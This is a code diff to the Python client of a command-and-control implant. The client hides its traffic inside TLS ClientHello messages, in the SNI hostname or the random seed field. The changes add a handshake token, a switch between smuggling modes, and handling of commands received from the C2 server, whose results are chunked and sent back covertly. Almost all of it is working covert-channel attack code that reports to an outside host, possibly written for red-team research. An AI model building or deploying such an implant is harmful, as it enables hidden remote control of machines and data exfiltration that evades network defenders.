@@ -51,10 +51,11 @@ NS_TO_MS = 1000000
 MAX_SNI_LEN = 254  # MAX LEN of SNI field value in terms of BYTES
 MAX_TLD_LEN = 4  # Our random TLD generator max char length
 SNI_PADDING_LEN = 3  # To have an RFC Compliant hostname, nodes can be no longer than 63 chars
-MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 2  # == 246 bytes
+MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 2  # == 245 bytes
 
 POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
 MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
+VERBOSE = True
 
 
 class Session:
@@ -100,6 +101,8 @@ class Session:
         # init some variables
         self.proxy = ""
         self.server = ""
+        self.mode = ""  # use SNI or random seed for smuggling, "sni" || "seed"
+        self.mss = CLIENT_MAX_SNI_SIZE  # our mode detemines the Maximum Segement Size
         self.tcp_socket = None
         self.connect_function = None
         self.connect_args = []
@@ -115,19 +118,18 @@ class Session:
         self.last_poll_time = 0
         self.message_list = []
         init_result = self._connect_init(server, proxy)
+        payload = b"_C2CRET_"
         if not init_result:
             return
         if test_mode:
-            payload = b"_FOOBAR_"
             print(f"TEST MODE: Sending '{payload}' as our payload... ")
-
             self._set_tls_client_hello(ClientMessage().test(), self._make_sni(payload))
         else:
             #
             # Send CONNECT to server to establish protocol level communication
             #
             # set our connect message
-            self._set_tls_client_hello(ClientMessage().connect(), self._get_random_sni())
+            self._set_tls_client_hello(ClientMessage().connect(), self._make_sni(payload))
         # send it!!
         response = self._send_message()
         if not response:
@@ -139,12 +141,18 @@ class Session:
         # print("DEBUG")
         # Now parse our header
         # The Server tells us what our client ID will be
-        if Message().get_msg_type(proto_header) == ServerMessage.TEST:
+        valid_san = False
+        use_sni = False
+        if (
+            Message().get_msg_type(proto_header) == ServerMessage.TEST
+            or Message().get_msg_type(proto_header) == ServerMessage.ACK
+        ):
             print(f"Raw Protocol Header: {proto_header}")
-            print(f"Raw SAN Payload: {san_payload}")
+            print(f"Decoded SAN Payload: {san_payload}")
             print()
             msg = san_payload.decode().split(",")
-            if msg[0] == "_FOOBAR_":
+            if msg[0] == "_C2CRET_":
+                valid_san = True
                 print("[+] Valid SAN payload recieved from the Server!")
             else:
                 print("[!] Invalid SAN message from server :(")
@@ -153,22 +161,25 @@ class Session:
             else:
                 print("[!] Random Seed Smuggling failed :(")
             if msg[2] == "True":
+                use_sni = True
                 print("[+] SNI Smuggling PASSED!")
             else:
                 print("[!] SNI smnuggling failed :(")
             print()
-            return
-        self.client_id = Message().get_client_id(proto_header)
-        if Message().get_msg_type(proto_header) != ServerMessage.ACK:
-            self.result_msg = f"Did not recieve an ACK message in response to our CONNECT request: Got '{Message().get_msg_type(proto_header).hex()}' instead"
-            # print(str(ServerMessage.ACK))
-            # print(len(proto_header))
         else:
+            self.result_msg = f"Did not recieve an ACK message in response to our CONNECT request: Got '{Message().get_msg_type(proto_header).hex()}' instead"
+        if Message().get_msg_type(proto_header) == ServerMessage.TEST:
+            return
+        if Message().get_msg_type(proto_header) == ServerMessage.ACK and valid_san:
             self.is_connected = True
-        if self.is_connected:
+            self.client_id = Message().get_client_id(proto_header)
             self.last_poll_time = int(time.time())
             # We should now have an established connection to our C2 Server now!
             self.result_msg = "OK"
+            if use_sni:
+                self.mode = "sni"
+            else:
+                self.mode = "seed"
             # Start up our Heatbeat in a seperate thread
             self.heartbeat_thread = threading.Thread(target=self._poll, daemon=True)
             self.is_heartbeat_active = True
@@ -228,6 +239,9 @@ class Session:
                         msg_text = san_payload.decode()
                     except:
                         msg_text = san_payload.hex()
+                    if VERBOSE:
+                        print()
+                        print(f" > Got cmd_available: {msg_text}")
                     api_result = API().client_handle(msg_text)
                     self.send(api_result)
                     self.message_list.append(
@@ -259,28 +273,37 @@ class Session:
         # NOTE: Ex. A single char 'c', >>> str('c').encode().hex() == '63' <- that's two chars :(
         # NOTE: This all means.. our SNI smuggled payload is HALVED. This is the cost of doing business.
         # test out what hex encoding will do to us:
-        max_msg_len = MAX_MSG_LEN
+        max_msg_len = self.mss
         if len(message.hex()) > len(message):
-            max_msg_len = int(MAX_MSG_LEN / 2)
+            max_msg_len = int(self.mss / 2)
         chunks = [message[i : i + max_msg_len] for i in range(0, len(message), max_msg_len)]
 
-        # TODO: This appears to finally work, but.. keep an eye on it!!
+        # TODO: MAKE THIS SEND WITH THREADS!!!
+        # TODO: we'll want to blast chunks, then send a RESPONSE msg type when done
+        # // threading this will... be interesting to say the least
 
         chunks_last_index = len(chunks) - 1
         smuggle = Message()
         for k, v in enumerate(chunks):
-            if k == chunks_last_index:
-                smuggle.header = self.client_id + ClientMessage.RESPONSE
-            else:
-                smuggle.header = self.client_id + ClientMessage.FRAGMENT
-            smuggle.body = struct.pack(">L", len(v)) + struct.pack(">L", k) + struct.pack(">L", smuggle.compute_crc(v))
-            smuggle.body = smuggle.body + self.session_id
+            smuggle.header = self.client_id + ClientMessage.FRAGMENT
+            smuggle.body = (
+                struct.pack(">L", len(chunks)) + struct.pack(">L", k) + struct.pack(">L", smuggle.compute_crc(v))
+            )
+            # TODO: this is where we will send payload in our smuggle object instead of SNI !!!
+            # smuggle.body = smuggle.body + self.session_id
             # print("DEBUG")
             # print(f"DEBUG_fragment_len:{len(v)}")
             # print(f"DEBUG_fragment_index:{k}")
             # print(f"DEBUG_header:{smuggle.header.hex()}")
             # print("DEBUG")
-            self._set_tls_client_hello(smuggle.to_bytes(), self._make_sni(v))
+            if self.mode == "sni":
+                self._set_tls_client_hello(smuggle.to_bytes(), self._make_sni(v))
+            else:
+                smuggle.payload = v.hex()
+                self._set_tls_client_hello(smuggle.to_bytes(), self._get_random_sni())
+            if VERBOSE:
+                print(f"> HEADERS: {smuggle.to_bytes().hex()}")
+                print(f"> SNI: {v}")
             for i in range(MAX_RETRIES):
                 if i == MAX_RETRIES - 1:
                     self.result_msg = "Failed to resend message - Max retries reached"
@@ -291,12 +314,26 @@ class Session:
                 if msg_type == ServerMessage.CRC_ERROR:
                     continue
                 if msg_type != ServerMessage.ACK:
-                    self.result_msg = "Server responded with an unexpected message: " + str(msg_type)
+                    self.result_msg = "Server responded with an unexpected message while sending a fragment: " + str(
+                        msg_type
+                    )
                     return False
                 break
             # end for(retries)
             total_rtt = total_rtt + self.rtt
         # end for(chunks)
+        # Now send our Final response msg, telling the server we are done sending
+        smuggle.header = self.client_id + ClientMessage.RESPONSE
+        smuggle.body = struct.pack(">L", len(chunks)) + struct.pack(">L", 0) + struct.pack(">L", 0)
+        self._set_tls_client_hello(smuggle.to_bytes(), self._get_random_sni())
+        response = self._send_message()
+        proto_header, san_payload = self._parse_server_hello(response)
+        msg_type = Message().get_msg_type(proto_header)
+        if msg_type != ServerMessage.ACK:
+            self.result_msg = "Server responded with an unexpected message while sending a response msg: " + str(
+                msg_type
+            )
+            return False
         self.rtt = total_rtt
         self.bytes_sent = len(message)
         msg_text = ""
